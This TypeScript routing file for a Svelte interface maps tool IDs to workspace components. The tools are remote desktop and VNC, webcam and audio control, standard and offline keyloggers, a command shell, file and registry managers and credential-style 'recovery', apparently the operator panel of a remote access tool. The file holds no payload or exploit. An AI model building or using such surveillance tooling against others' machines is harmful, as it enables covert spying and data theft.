import type { Component } from 'svelte';
import type { ClientToolId, DialogToolId } from './client-tools';
import AppVncWorkspace from '$lib/components/workspace/tools/app-vnc-workspace.svelte';
import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop-workspace.svelte';
import WebcamControlWorkspace from '$lib/components/workspace/tools/webcam-control-workspace.svelte';
import AudioControlWorkspace from '$lib/components/workspace/tools/audio-control-workspace.svelte';
import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
import SystemInfoWorkspace from '$lib/components/workspace/tools/system-info-workspace.svelte';
import SystemMonitorWorkspace from '$lib/components/workspace/tools/system-monitor-workspace.svelte';
import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
import OpenUrlWorkspace from '$lib/components/workspace/tools/open-url-workspace.svelte';
import TriggerMonitorWorkspace from '$lib/components/workspace/tools/trigger-monitor-workspace.svelte';
import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
import EnvironmentVariablesWorkspace from '$lib/components/workspace/tools/environment-variables-workspace.svelte';
import NotesWorkspace from '$lib/components/workspace/tools/notes-workspace.svelte';

import type { Client } from './clients';
import type { AgentSnapshot } from '../../../../shared/types/agent';
import type { RemoteDesktopSessionState } from '$lib/types/remote-desktop';

export type WorkspaceProps = {
	client: Client;
	agent?: AgentSnapshot | null;
	initialSession?: RemoteDesktopSessionState | null;
};

export const workspaceComponentMap: Partial<Record<DialogToolId, Component<WorkspaceProps>>> = {
	'app-vnc': AppVncWorkspace as Component<WorkspaceProps>,
	'remote-desktop': RemoteDesktopWorkspace as Component<WorkspaceProps>,
	'webcam-control': WebcamControlWorkspace as Component<WorkspaceProps>,
	'audio-control': AudioControlWorkspace as Component<WorkspaceProps>,
	cmd: CmdWorkspace as Component<WorkspaceProps>,
	'file-manager': FileManagerWorkspace as Component<WorkspaceProps>,
	'system-info': SystemInfoWorkspace as Component<WorkspaceProps>,
	'system-monitor': SystemMonitorWorkspace as Component<WorkspaceProps>,
	'registry-manager': RegistryManagerWorkspace as Component<WorkspaceProps>,
	'clipboard-manager': ClipboardManagerWorkspace as Component<WorkspaceProps>,
	recovery: RecoveryWorkspace as Component<WorkspaceProps>,
	options: OptionsWorkspace as Component<WorkspaceProps>,
	'open-url': OpenUrlWorkspace as Component<WorkspaceProps>,
	notes: NotesWorkspace as Component<WorkspaceProps>,
	'client-chat': ClientChatWorkspace as Component<WorkspaceProps>,
	'trigger-monitor': TriggerMonitorWorkspace as Component<WorkspaceProps>,
	'ip-geolocation': IpGeolocationWorkspace as Component<WorkspaceProps>,
	'environment-variables': EnvironmentVariablesWorkspace as Component<WorkspaceProps>
};

const keyloggerModesMap: Partial<Record<DialogToolId, 'standard' | 'offline'>> = {
	'keylogger-standard': 'standard',
	'keylogger-offline': 'offline'
};

export const workspaceToolIds = [
	'app-vnc',
	'remote-desktop',
	'webcam-control',
	'audio-control',
	'keylogger-standard',
	'keylogger-offline',
	'cmd',
	'file-manager',
	'system-info',
	'system-monitor',
	'registry-manager',
	'clipboard-manager',
	'recovery',
	'options',
	'open-url',
	'notes',
	'client-chat',
	'trigger-monitor',
	'ip-geolocation',
	'environment-variables'
] as const satisfies readonly DialogToolId[];

export const workspaceRequiresAgent = new Set<DialogToolId>(['cmd']);

const workspaceToolSet = new Set<DialogToolId>(workspaceToolIds);

export function isWorkspaceTool(id: ClientToolId): id is DialogToolId {
	return workspaceToolSet.has(id as DialogToolId);
}

export function getWorkspaceComponent(id: DialogToolId): Component<WorkspaceProps> | null {
	return workspaceComponentMap[id] ?? null;
}

export function getKeyloggerMode(id: DialogToolId): 'standard' | 'offline' | null {
	return keyloggerModesMap[id] ?? null;
}
